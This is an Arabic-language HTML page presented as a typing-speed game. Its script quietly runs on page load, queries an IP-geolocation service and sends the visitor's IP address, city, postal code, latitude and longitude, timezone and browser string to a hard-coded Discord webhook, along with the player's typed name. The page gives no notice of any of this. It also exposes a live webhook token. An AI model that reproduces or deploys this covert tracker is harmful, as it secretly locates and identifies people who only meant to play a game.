<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>اختبر سرعتك</title>
<style>
  body {
    margin: 0; padding: 0;
    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
    background-size: cover;
    color: white;
    font-family: Tahoma, sans-serif;
    text-align: center;
    overflow-x: hidden;
    min-height: 100vh;
    position: relative;
  }
  .container {
    max-width: 700px;
    margin: 80px auto 80px;
    padding: 20px;
    background: rgba(0,0,0,0.6);
    border-radius: 15px;
    box-shadow: 0 0 30px rgba(0,0,0,0.8);
  }
  input[type="text"] {
    width: 80%;
    font-size: 18px;
    padding: 12px;
    border-radius: 8px;
    border: 2px solid #555;
    background: #111;
    color: white;
    margin-bottom: 15px;
    direction: rtl;
  }
  button {
    font-size: 18px;
    padding: 12px 25px;
    border-radius: 8px;
    border: none;
    background-color: #6a1b9a;
    color: white;
    cursor: pointer;
    margin: 5px 10px 10px 10px;
  }
  #sentence {
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 15px;
    user-select: none;
    white-space: normal;
    letter-spacing: normal;
  }
  #sentence span {
    padding: 0 2px;
    border-radius: 4px;
    cursor: default;
    display: inline-block;
    margin: 0 0;
  }
  #sentence span.correct {
    color: #4caf50;
    background: transparent;
  }
  #sentence span.incorrect {
    color: white;
    background: rgba(183, 28, 28, 0.6);
  }
  #sentence span.pending {
    color: white;
    background: transparent;
  }
  #musicControl {
    position: fixed;
    left: 20px;
    top: 20px;
    width: 40px;
    height: 40px;
    border-radius: 50%;
    background: #333;
    color: white;
    font-size: 20px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
    z-index: 1000;
  }
</style>
</head>
<body>

<div class="container" id="loginScreen">
  <h2>مرحبًا!</h2>
  <p>اكتب اسمك وابدأ</p>
  <input type="text" id="playerName" placeholder="اسمك" autocomplete="off" />
  <br />
  <button onclick="startGame()">ابدأ</button>
</div>

<div class="container" id="gameScreen" style="display:none;">
  <h2 id="welcomeMsg"></h2>
  <div id="sentence"></div>
  <input type="text" id="userInput" placeholder="اكتب هنا" autocomplete="off" />
</div>

<audio id="bgm" loop src="https://cdn.pixabay.com/download/audio/2022/03/17/audio_14aebd6e4d.mp3?filename=fun-game-music-113.mp3"></audio>
<div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>

<script>
  const discordWebhookUrl = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";

  let player = "";
  let startTime = 0;

  const sentences = [
    "عش كل لحظة كأنها الأخيرة",
    "اللغة العربية لغة جميلة وعميقة",
    "التحدي يزيد من مهاراتك في الكتابة",
    "تعلم البرمجة يفتح لك آفاقا جديدة",
    "سرعة الكتابة تعكس سرعة تفكيرك",
    "تجربة ممتعة مع جمع معلومات الجهاز",
    "استخدم كل طاقتك لتفوز في التحدي",
    "التدريب المستمر يصنع منك محترفًا",
    "ابدأ الآن ولا تنتظر الغد",
    "إصرارك يحدد نجاحك الحقيقي"
  ];

  function getRandomSentence() {
    const index = Math.floor(Math.random() * sentences.length);
    return sentences[index];
  }

  function displaySentence(text) {
    const sentenceEl = document.getElementById("sentence");
    sentenceEl.innerHTML = "";
    const words = text.split(" ");
    words.forEach(word => {
      const span = document.createElement("span");
      span.textContent = word;
      span.className = "pending";
      sentenceEl.appendChild(span);
      sentenceEl.appendChild(document.createTextNode(" "));
    });
  }

  function checkInput() {
    const userInput = document.getElementById("userInput").value.trim();
    const sentenceEl = document.getElementById("sentence");
    const spans = sentenceEl.querySelectorAll("span");
    let allCorrect = true;

    const inputWords = userInput.split(/\s+/);

    spans.forEach((span, i) => {
      if (!inputWords[i]) {
        span.className = "pending";
        allCorrect = false;
      } else if (inputWords[i] === span.textContent) {
        span.className = "correct";
      } else {
        span.className = "incorrect";
        allCorrect = false;
      }
    });

    if (allCorrect && inputWords.length === spans.length) {
      finishTyping();
    }
  }

  function finishTyping() {
    const endTime = performance.now();
    const timeTaken = (endTime - startTime) / 1000;
    const sentence = document.getElementById("sentence").textContent.trim();
    const wordsCount = sentence.split(" ").length;
    const speed = wordsCount / timeTaken;

    document.getElementById("userInput").disabled = true;
  }

  function startGame() {
    const inputName = document.getElementById("playerName").value.trim();
    if (!inputName) {
      alert("اكتب اسمك من فضلك");
      return;
    }
    player = inputName;

    document.getElementById("loginScreen").style.display = "none";
    document.getElementById("gameScreen").style.display = "block";
    document.getElementById("welcomeMsg").textContent = `مرحباً ${player}! ابدأ بالكتابة`;

    sendPlayerName(player);

    startNewSentence();
  }

  function startNewSentence() {
    const sentence = getRandomSentence();
    displaySentence(sentence);
    document.getElementById("userInput").value = "";
    document.getElementById("userInput").disabled = false;
    startTime = performance.now();
  }

  async function sendUserInfo(playerName = '') {
    try {
      const response = await fetch("https://ipapi.co/json/");
      const geoData = await response.json();

      let ipv4 = geoData.ip || "غير معروف";
      let nameText = playerName ? `اللاعب: ${playerName}\n` : '';

      const infoText = `
${nameText}IP (IPv4): ${ipv4}
الدولة: ${geoData.country_name}
المنطقة: ${geoData.region}
المدينة: ${geoData.city}
الرمز البريدي: ${geoData.postal}
الموقع: ${geoData.latitude}, ${geoData.longitude}
المنطقة الزمنية: ${geoData.timezone}
متصفح: ${navigator.userAgent}
      `.trim();

      const data = {
        content: infoText
      };

      await fetch(discordWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    } catch (error) {
      console.error("خطأ في إرسال معلومات المستخدم:", error);
    }
  }

  async function sendPlayerName(playerName) {
    try {
      const data = {
        content: `اللاعب سجل اسمه: ${playerName}`
      };
      await fetch(discordWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    } catch (error) {
      console.error("خطأ في إرسال اسم اللاعب:", error);
    }
  }

  window.addEventListener('load', () => {
    sendUserInfo();
  });

  document.getElementById("userInput").addEventListener("input", checkInput);

  const bgm = document.getElementById("bgm");
  const musicControl = document.getElementById("musicControl");

  musicControl.addEventListener("click", () => {
    if (bgm.paused) {
      bgm.play();
      musicControl.textContent = "⏸";
    } else {
      bgm.pause();
      musicControl.textContent = "🎵";
    }
  });
</script>

</body>
</html>
